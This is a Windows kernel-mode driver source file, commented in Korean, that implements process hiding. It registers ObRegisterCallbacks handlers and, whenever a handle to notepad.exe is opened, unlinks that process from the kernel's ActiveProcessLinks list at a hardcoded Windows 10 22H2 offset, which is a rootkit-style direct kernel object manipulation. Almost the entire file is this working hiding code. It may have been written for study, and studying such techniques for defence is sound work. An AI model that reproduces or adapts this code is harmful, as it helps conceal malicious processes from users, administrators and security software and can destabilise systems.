/*++

Module Name:

   .c

Abstract:

    ObRegisterCallbacks를 이용한 프로세스 은닉 기능 구현

Environment:

    Kernel mode

--*/

#include <fltKernel.h>
#pragma prefast(disable:__WARNING_ENCODE_MEMBER_FUNCTION_POINTER, "Not valid for kernel mode drivers")


typedef PCHAR(*GET_PROCESS_IMAGE_NAME) (PEPROCESS Process);
GET_PROCESS_IMAGE_NAME PsGetProcessImageFileName;
PVOID gObRegHandle = NULL;

/*************************************************************************
    Prototypes
*************************************************************************/

EXTERN_C_START
DRIVER_INITIALIZE DriverEntry;
NTSTATUS
DriverEntry (
    _In_ PDRIVER_OBJECT DriverObject,
    _In_ PUNICODE_STRING RegistryPath
    );
VOID UnloadDriver(IN PDRIVER_OBJECT DriverObject);
EXTERN_C_END


/*************************************************************************
    UserDefined ...
*************************************************************************/


void ObPostOperation (
    PVOID RegistrationContext,
    POB_POST_OPERATION_INFORMATION pOperationInformation
) {
    if (KeGetCurrentIrql() != PASSIVE_LEVEL) {
        return;
    } // IRQL 체크 (ObPostOperation == PASSIVE_LEVEL)

    UNREFERENCED_PARAMETER(RegistrationContext);
    if (PsGetProcessImageFileName == NULL) {
        return;
    } // Undocumented API에 대한 주소가 없으면 return


    PEPROCESS pDstEProcess = NULL;
    if (pOperationInformation->ObjectType == *PsThreadType) {
        pDstEProcess = IoThreadToProcess((PETHREAD)pOperationInformation->Object);
        // 스레드 객체일 경우, 해당 스레드가 위치한 프로세스 객체를 사용
    } else if (pOperationInformation->ObjectType == *PsProcessType) {
        pDstEProcess = (PEPROCESS)pOperationInformation->Object;
    } else {
        return;
    } // 접근 당하는 EPROCESS 개체를 구함

    PCHAR pDstEProcessNameChar = NULL;
    pDstEProcessNameChar = PsGetProcessImageFileName(pDstEProcess);
    if (!pDstEProcessNameChar) {
        return;
    } // 접근 당하는 프로세스 이름을 구할 수 없으면 return

    ANSI_STRING DstEProcessNameString;
    ANSI_STRING DstCmpProcessName;
    RtlInitString(&DstEProcessNameString, pDstEProcessNameChar);
    RtlInitString(&DstCmpProcessName, "notepad.exe");
    // PCHAR을 ANSI_STRING으로 변환

    if (RtlCompareString(&DstEProcessNameString, &DstCmpProcessName, TRUE) != 0) {
        return;
    } // 접근 당하는 프로세스 이름이 notepad.exe가 아니면 return


    PLIST_ENTRY pDstEProcessEntry = (PLIST_ENTRY)((PCHAR)pDstEProcess+0x448);
    // Windows 10 22H2 x64 기준, EPROCESS에서 ActiveProcessLinks 구조체 위치

    if ((!MmIsAddressValid(pDstEProcessEntry->Blink)) || (!MmIsAddressValid(pDstEProcessEntry->Flink))) {
        return;
    } // 해당 메모리 주소에 접근할 수 없으면 return

    if ((pDstEProcessEntry->Flink == pDstEProcessEntry) || (pDstEProcessEntry->Blink == pDstEProcessEntry)) {
        return;
    } // 이미 ActiveProcessLinks가 자기 자신으로 링크되어 있으면 return

    pDstEProcessEntry->Blink->Flink = pDstEProcessEntry->Flink;
    pDstEProcessEntry->Flink->Blink = pDstEProcessEntry->Blink;
    // 뒤에 있는 리스트와 앞에 있는 리스트에서 자기 리스트를 제외하여 이어준다.

    pDstEProcessEntry->Flink = pDstEProcessEntry;
    pDstEProcessEntry->Blink = pDstEProcessEntry;
    // 자기 리스트는 자기 자신을 가르키도록 이어준다.

}



NTSTATUS ObRegisterInit() {
    if (KeGetCurrentIrql() > APC_LEVEL) {
        DbgPrint("[DRIVER] Driver IRQL Mismatched.\n");
        DbgPrint("[DRIVER] Unload Driver\n");
        return STATUS_UNSUCCESSFUL;
    } // IRQL 체크 (ObRegisterCallbacks <= APC_LEVEL)

    OB_OPERATION_REGISTRATION ObOperationReg[2] = {0, };
    ObOperationReg[0].ObjectType = PsProcessType;
    ObOperationReg[0].Operations = OB_OPERATION_HANDLE_CREATE | OB_OPERATION_HANDLE_DUPLICATE;
    ObOperationReg[0].PreOperation = NULL;
    ObOperationReg[0].PostOperation = ObPostOperation;
    // Process에 대해 PostOperation을 수행하는 구조체 설정

    ObOperationReg[1].ObjectType = PsThreadType;
    ObOperationReg[1].Operations = OB_OPERATION_HANDLE_CREATE | OB_OPERATION_HANDLE_DUPLICATE;
    ObOperationReg[1].PreOperation = NULL;
    ObOperationReg[1].PostOperation = ObPostOperation;
    // Thread에 대해 PostOperation을 수행하는 구조체 설정

    OB_CALLBACK_REGISTRATION ObCallbackReg = {0, };
    ObCallbackReg.Version = ObGetFilterVersion();
    ObCallbackReg.OperationRegistrationCount = 2; // ObOperationReg[n]의 개수
    ObCallbackReg.RegistrationContext = NULL;
    ObCallbackReg.OperationRegistration = ObOperationReg;
    RtlInitUnicodeString(&ObCallbackReg.Altitude, L"400000");
    // ObRegister을 등록하는 구조체 설정

    return ObRegisterCallbacks(&ObCallbackReg, &gObRegHandle);
}



/*************************************************************************
    MiniFilter initialization and unload routines.
*************************************************************************/

NTSTATUS
DriverEntry(
    _In_ PDRIVER_OBJECT DriverObject,
    _In_ PUNICODE_STRING RegistryPath
)
{
    NTSTATUS status;
    UNREFERENCED_PARAMETER(RegistryPath);
    DriverObject->DriverUnload = UnloadDriver;

    UNICODE_STRING sPsGetProcessImageFileName = RTL_CONSTANT_STRING(L"PsGetProcessImageFileName");
    PsGetProcessImageFileName = (GET_PROCESS_IMAGE_NAME)MmGetSystemRoutineAddress(&sPsGetProcessImageFileName);

    status = ObRegisterInit();
    if (NT_SUCCESS(status)) {
        DbgPrint("[DRIVER] ObRegisterCallback Success\n");
    } else {
        DbgPrint("[DRIVER] ObRegisterCallback Failed: 0x%08X\n", status);
    }
    return status;
}

VOID UnloadDriver(IN PDRIVER_OBJECT DriverObject)
{
    UNREFERENCED_PARAMETER(DriverObject);

    if (gObRegHandle){
        ObUnRegisterCallbacks(gObRegHandle);
    }
}